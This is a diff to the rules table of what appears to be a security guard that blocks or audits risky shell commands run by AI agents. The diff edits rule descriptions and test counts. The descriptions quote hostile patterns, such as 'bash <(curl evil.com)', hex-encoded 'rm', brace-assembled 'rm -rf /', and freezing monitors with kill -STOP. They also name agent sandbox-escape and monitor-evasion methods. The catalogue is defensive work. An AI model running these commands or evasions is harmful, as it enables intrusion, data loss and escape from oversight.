@@ -9,7 +9,7 @@
 | Terminal rules | 1009 |
 | MCP rules | 373 |
 | Total rules | 1382 |
-| Test cases (TP+TN) | 3553 |
+| Test cases (TP+TN) | 3556 |
 | Kingdoms covered | 10 |
 
 ## Runtime Rules by Kingdom
@@ -366,7 +366,7 @@
 | `ts-block-psql-truncate-table` | BLOCK | regex | PostgreSQL TRUNCATE TABLE executed via psql CLI — deletes all rows immediately, can CASCADE to child tables, and resets sequences. Irreversible without a backup. MITRE T1485. |
 | `ts-block-git-force-push-main` | BLOCK | regex | Force pushing to main/master can destroy shared commit history. |
 | `ts-block-git-force-push-main-alt` | BLOCK | regex | Force pushing to main/master can destroy shared commit history. |
-| `ts-block-git-reset-hard-commits` | BLOCK | regex | git reset --hard HEAD~N or --hard <sha> permanently drops committed work from the branch. An AI agent running this can silently discard hours of committed changes with no undo (MITRE T1485). |
+| `ts-block-git-reset-hard-commits` | BLOCK | regex | git reset --hard HEAD~N, HEAD~ (bare tilde), or --hard <sha> permanently drops committed work from the branch. An AI agent running this can silently discard hours of committed changes with no undo (MITRE T1485). |
 | `ts-block-git-filter-branch` | BLOCK | structural | git filter-branch rewrites the entire repository commit graph. This permanently alters history for all branches and is irreversible once force-pushed to remotes (MITRE T1485, T1070.004). |
 | `ts-block-git-filter-repo` | BLOCK | structural | git filter-repo rewrites repository history (modern replacement for filter-branch). Permanent and irreversible once propagated to remotes (MITRE T1485, T1070.004). |
 | `ts-block-bfg-repo-cleaner` | BLOCK | structural | BFG Repo Cleaner rewrites git history to remove large files or secrets. Creates a new commit graph incompatible with existing clones — irreversible once force-pushed (MITRE T1485). |
@@ -484,7 +484,7 @@
 | `ts-block-ttyd-shell` | BLOCK | regex | ttyd starts an HTTP terminal server exposing a shell via browser. Any host that can reach the listening port gets an interactive shell. MITRE T1219, T1071.001. |
 | `ts-block-gotty-shell` | BLOCK | regex | gotty starts an HTTP terminal server exposing a shell via browser. Any reachable host gets an interactive web-based shell. MITRE T1219, T1071.001. |
 | `ts-block-git-config-sshcommand` | BLOCK | regex | git config core.sshCommand replaces the SSH binary for all remote git operations — attacker can execute arbitrary commands on every push/pull/fetch. MITRE T1574. |
-| `ts-block-git-config-pager` | BLOCK | regex | git config core.pager replaces the pager command for git log/diff/show — runs arbitrary command every time output is paged. MITRE T1574. |
+| `ts-block-git-config-pager` | BLOCK | regex | git config core.pager set to a shell interpreter (bash, sh, python, etc.) or a pipeline expression — runs arbitrary code on every git log/diff/show. Legitimate pagers (delta, bat, less, diff-so-fancy) are not flagged. MITRE T1574. |
 | `ts-block-git-config-fsmonitor` | BLOCK | regex | git config core.fsmonitor sets a command that runs automatically on every git status — persistent background code execution. CVE-2022-24765 abused this. MITRE T1546. |
 | `ts-block-git-config-textconv` | BLOCK | regex | git config diff.*.textconv sets a command that runs every time git diff encounters a matching file type — hidden code execution on routine diff operations. MITRE T1574. |
 | `ts-block-git-alias-shell` | BLOCK | regex | git config alias.* with '!' prefix creates a shell-command alias — 'git <alias>' will execute arbitrary shell commands. Attackers use this to trojanize common git workflows. MITRE T1546. |
@@ -628,7 +628,7 @@
 | `ts-block-dbus-polkit` | BLOCK | regex | D-Bus call targeting PolicyKit authorization service — can register/modify authorization policies, potentially granting unattended privilege escalation for future actions. MITRE T1548. |
 | `ts-block-dbus-udisks` | BLOCK | regex | D-Bus call targeting UDisks2 disk management — can mount, unmount, format, or wipe disks without sudo. Destructive or exfiltration potential via removable media. MITRE T1561. |
 | `ts-audit-dbus-system-bus` | AUDIT | regex | D-Bus system bus call — the system bus hosts privileged services. Any system bus interaction from an AI agent warrants logging. MITRE T1548. |
-| `ts-audit-confused-deputy-eval` | AUDIT | regex | eval/exec on a command substitution or captured variable — if the substituted output originates from an MCP tool response, this is a confused deputy pattern where the agent proxies untrusted instructions with its own privileges (OWASP LLM06, CWE-441). |
+| `ts-audit-confused-deputy-eval` | AUDIT | regex | eval/exec on a network fetch, base64 decode, or shell pipe — high-confidence confused deputy pattern where agent proxies untrusted remote content with its own privileges. Known-safe local tool evals (ssh-agent, brew shellenv, direnv, rbenv, pyenv) are not flagged. OWASP LLM06, CWE-441. |
 | `ts-block-chroot-proc-escape` | BLOCK | regex | chroot to /proc/PID/root escapes filesystem isolation by pivoting to the host root via procfs — classic container escape technique. MITRE T1611, CWE-22. |
 | `ts-block-pivot-root` | BLOCK | regex | pivot_root changes the mount namespace root — used by container runtimes at startup, not by running agents. An AI agent invoking pivot_root is attempting to escape its filesystem sandbox. MITRE T1611. |
 | `ts-block-deep-path-traversal` | BLOCK | regex | Deep relative path traversal (4+ levels) targeting system directories — indicates sandbox escape attempt to access files outside the designated workspace boundary. OWASP LLM06, CWE-22, MITRE T1083. |
@@ -901,7 +901,7 @@
 | `ts-audit-ai-watch-loop` | AUDIT | regex | watch executing an AI CLI — creates an infinite timed loop of API calls with no iteration budget. Even at 2s intervals this fires 1800 API calls/hour; a denial-of-wallet vector (OWASP LLM10, CWE-834). |
 | `ts-df-block-llm-output-to-shell` | BLOCK | dataflow | LLM CLI output piped to shell execution — prompt injection turns into arbitrary code execution. An attacker who influences LLM context can have the agent run malicious shell commands (OWASP LLM01, MITRE T1059). |
 | `ts-block-pipe-to-shell` | BLOCK | regex | Pipe-to-shell executes unreviewed remote code. |
-| `ts-block-pipe-to-interpreter` | BLOCK | regex | Pipe to interpreter (python3/node/ruby/perl/php) reading from stdin as code — semantically identical to pipe-to-bash but evades shell-name detection. Matches 'python3' or 'python3 -' at end of pipe; excludes '-c' inline script variants which are safe data-processing patterns. OWASP LLM06, CWE-78, MITRE T1059. |
+| `ts-block-pipe-to-interpreter` | BLOCK | regex | Pipe to interpreter (python3/node/ruby/perl/php) reading from stdin as code — semantically identical to pipe-to-bash but evades shell-name detection. Matches 'python3', 'python3 -', and 'python3 2>/dev/null' forms; excludes '-c' inline script variants. OWASP LLM06, CWE-78, MITRE T1059. |
 | `ts-block-pipe-to-modern-interpreter` | BLOCK | regex | Pipe to modern interpreter (deno/bun/lua/tclsh/Rscript) reading from stdin as code — semantically identical to pipe-to-bash. Deno and Bun in particular are increasingly common alternatives to node for TypeScript/JS remote code execution. OWASP LLM06, CWE-78, MITRE T1059. |
 | `ts-block-eval-subshell-rce` | BLOCK | regex | eval with remote command substitution executes unreviewed remote code — evades pipe-to-shell detection. |
 | `ts-block-shell-c-remote-subshell` | BLOCK | regex | shell -c with remote subshell executes unreviewed remote code — pipe-to-shell evasion via -c flag. |
@@ -940,7 +940,7 @@
 | `ts-sf-block-download-execute` | BLOCK | stateful | Stateful: direct pipe from downloader to interpreter detected (download-then-execute via pipe). Excludes python3 -c (inline script reading stdin as data, not as code). |
 | `ts-block-terraform-apply-auto-approve` | BLOCK | regex | terraform/tofu/terragrunt apply -auto-approve skips the plan review step entirely — AI agents may apply wide-scope changes (opening security groups, modifying IAM policies) without any human gate. Always review terraform plan output before apply. (OWASP LLM05, MITRE T1578) |
 | `ts-block-cdk-deploy-no-approval` | BLOCK | regex | cdk deploy --require-approval never suppresses the CDK approval prompt for security-sensitive changes (IAM policy broadening, security group rule addition). AI agents must not bypass this gate. (OWASP LLM05, MITRE T1578) |
-| `ts-audit-terraform-apply-no-scan` | AUDIT | regex | terraform apply without a preceding security scan (checkov, tfsec, trivy) — AI-generated IaC may contain wildcard IAM policies or open security groups. Run 'checkov -d . && terraform apply' to scan before apply. (OWASP LLM05, MITRE T1578) |
+| `ts-audit-terraform-apply-no-scan` | AUDIT | regex | terraform apply — AI-generated IaC may contain wildcard IAM policies or open security groups. Consider running 'checkov -d . && terraform apply' or 'tfsec . && terraform apply' to scan before applying. (OWASP LLM05, MITRE T1578) |
 | `ts-audit-helm-install-upgrade` | AUDIT | regex | helm install/upgrade applies Kubernetes resources to the cluster. AI-generated chart values may set elevated security contexts or overly broad service exposure. Use --dry-run first to review what will be deployed. (OWASP LLM05, MITRE T1578) |
 | `ts-audit-pulumi-up` | AUDIT | regex | pulumi up applies all pending stack changes without a separate plan review step. AI-generated Pulumi code may create misconfigured resources (open security groups, public storage buckets) or enable unauthorized infrastructure modifications. Run 'pulumi preview' first and review the output before applying. (OWASP LLM08, MITRE T1578) |
 | `ts-audit-aws-cfn-deploy` | AUDIT | regex | aws cloudformation deploy/create-stack/update-stack or sam deploy applies infrastructure changes to AWS immediately. AI-generated CloudFormation templates may grant excessive IAM permissions or expose resources publicly. Use --no-execute-changeset to review the changeset before execution. (OWASP LLM08, MITRE T1578) |
@@ -968,7 +968,7 @@
 | `ts-block-strace-credential-sniff` | AUDIT | regex | strace filtering for data-carrying syscalls (read/write/network) — commonly used to sniff credentials and API keys from running processes or commands. MITRE T1057. |
 | `ts-block-ltrace-attach` | BLOCK | regex | ltrace attaching to a running process intercepts library calls including crypto and SSL functions, exposing credentials at the API level. MITRE T1057. |
 | `ts-block-gcore-dump` | BLOCK | prefix | gcore dumps the entire memory of a running process to a file — exposes all heap-allocated secrets, API keys, system prompts, and in-flight credentials. MITRE T1003. |
-| `ts-block-ansic-hex-escape` | BLOCK | regex | ANSI-C quoting with hex escapes ($'\xNN') — encodes arbitrary bytes to evade command detection. An attacker can write $'\x72\x6d' instead of 'rm', completely bypassing string-based rules. Legitimate shell scripts use $'\t' or $'\n', not hex encoding. MITRE T1027.004. |
+| `ts-block-ansic-hex-escape` | BLOCK | regex | ANSI-C quoting with multiple hex escapes ($'\xNN\xNN...') — encodes command words as arbitrary bytes to evade detection (e.g. $'\x72\x6d' = 'rm'). Requires 2+ hex escapes to avoid false positives on single-escape sequences like $'\x1b[0;31m' (ANSI terminal colors). MITRE T1027.004. |
 | `ts-block-ansic-octal-escape` | BLOCK | regex | ANSI-C quoting with octal escapes ($'\NNN') — encodes arbitrary bytes using octal notation to evade detection. Same evasion technique as hex encoding but using base-8 (e.g., $'\162\155' = rm). MITRE T1027.004. |
 | `ts-block-ansic-unicode-escape` | BLOCK | regex | ANSI-C quoting with unicode escapes ($'\uNNNN') — can encode commands using unicode code points. Also enables homoglyph attacks where visually identical but semantically different characters bypass allowlists. MITRE T1027.004. |
 | `ts-block-procsub-input-exec` | BLOCK | regex | Input process substitution feeding remote content directly to an interpreter (e.g., bash <(curl evil.com)) — pipe-to-shell evasion without a visible pipe character. MITRE T1059. |
@@ -980,7 +980,7 @@
 | `ts-block-eval-brace-expansion` | BLOCK | regex | eval/exec with brace expansion assembles commands from fragments at shell expansion time — the literal command string never contains the final dangerous command, evading regex-based detection. Example: 'eval {r,m} -rf /' assembles 'rm -rf /'. MITRE T1027.004. |
 | `ts-block-cmdsub-brace-eval` | BLOCK | regex | echo with brace expansion inside command substitution or eval constructs command names from fragments — $(echo {r,m}) produces 'rm'. Combines two layers of indirection to evade detection. MITRE T1027.004. |
 | `ts-block-brace-var-exec` | BLOCK | regex | Brace expansion result stored in a variable and then executed — two-stage command construction that first assembles the payload, then runs it. Evades single-pass detection. MITRE T1027.004. |
-| `ts-block-printf-hex-pipe-shell` | BLOCK | regex | printf with hex escape sequences piped to a shell interpreter — constructs and executes encoded commands, evading ANSI-C quoting detection. MITRE T1027.004. |
+| `ts-block-printf-hex-pipe-shell` | BLOCK | regex | printf with hex escape sequences piped to a shell interpreter — constructs and executes encoded commands, evading ANSI-C quoting detection. Covers both quoted ($'\xNN') and format-string (printf %b '\xNN') variants. MITRE T1027.004. |
 | `ts-block-echo-hex-pipe-shell` | BLOCK | regex | echo -e with hex escape sequences piped to a shell — decodes hex bytes and executes the result as a command. MITRE T1027.004. |
 | `ts-block-printf-hex-eval` | BLOCK | regex | eval executing command-substituted printf with hex escapes — decodes and evaluates an obfuscated command string. MITRE T1027.004. |
 | `ts-block-printf-octal-pipe-shell` | BLOCK | regex | printf with octal escape sequences piped to a shell — constructs commands from octal-encoded bytes. MITRE T1027.004. |
@@ -1027,7 +1027,7 @@
 | `ts-block-signal-process-freeze` | BLOCK | regex | Sending SIGSTOP/SIGTSTP/SIGCONT to a process — freezes a process without killing it. Used to silently pause security monitors while performing malicious actions, then resume them leaving no evidence. MITRE T1562.001. |
 | `ts-block-pkill-process-freeze` | BLOCK | regex | Sending SIGSTOP/SIGTSTP/SIGCONT via pkill/killall — freezes processes by name pattern. Can target security monitors (agentshield, auditd, falco) without knowing their PID. MITRE T1562.001. |
 | `ts-block-signal-freeze-pgrep` | BLOCK | regex | SIGSTOP/SIGCONT via command substitution (e.g., kill -STOP $(pgrep auditd)) — dynamically discovers and freezes monitoring processes. The substitution makes detection harder. MITRE T1562.001. |
-| `ts-block-error-recovery-sudo` | BLOCK | regex | Privilege escalation via error recovery: a failed command is immediately retried with sudo. AI agents use \|\| (run-on-failure) to auto-escalate after 'Permission denied' — a high-confidence agentic attack pattern (OWASP LLM06, NIST GOVERN-1). The agent should surface the error to the user, not autonomously escalate privileges. |
+| `ts-block-error-recovery-sudo` | AUDIT | regex | Privilege escalation via error recovery: a failed command is immediately retried with sudo. AI agents use \|\| (run-on-failure) to auto-escalate after 'Permission denied' — a common agentic attack pattern. Downgraded from BLOCK to AUDIT to allow legitimate developer idioms (e.g. 'apt-get update \|\| sudo apt-get update'). OWASP LLM06, NIST GOVERN-1. |
 | `ts-audit-error-recovery-tls-bypass` | AUDIT | regex | TLS verification bypass in error recovery context: an agent automatically disabled certificate checking after a connection failure. Disabling TLS validation against production endpoints removes a critical security control and enables MITM attacks (OWASP LLM06, EU AI Act Art.9). Human review required before proceeding. |
 | `ts-audit-error-recovery-chmod` | AUDIT | regex | Permission weakening in error recovery context: a failed command is followed by chmod to world-writable (777, o+w, a+w). AI agents autonomously weaken file permissions as a self-correction for 'Permission denied' errors — directly undermining least-privilege security controls (OWASP LLM06, EU AI Act Art.9). Human review required. |
 | `ts-audit-shell-history-manipulation` | AUDIT | regex | Shell history manipulation detected — reading, writing, or editing command history can be used to inject or replay a captured agent workflow sequence (OWASP LLM06, MITRE T1059). Verify this is intentional history management. |
@@ -1511,10 +1511,10 @@
 | data-exfiltration | 283 | 177 | 460 |
 | destructive-ops | 132 | 89 | 221 |
 | governance-risk | 70 | 53 | 123 |
-| persistence-evasion | 287 | 172 | 459 |
+| persistence-evasion | 287 | 173 | 460 |
 | privilege-escalation | 284 | 172 | 456 |
 | reconnaissance | 172 | 78 | 250 |
 | supply-chain | 241 | 170 | 411 |
-| unauthorized-execution | 401 | 272 | 673 |
-| **Total** | **2155** | **1398** | **3553** |
+| unauthorized-execution | 402 | 273 | 675 |
+| **Total** | **2156** | **1400** | **3556** |
 
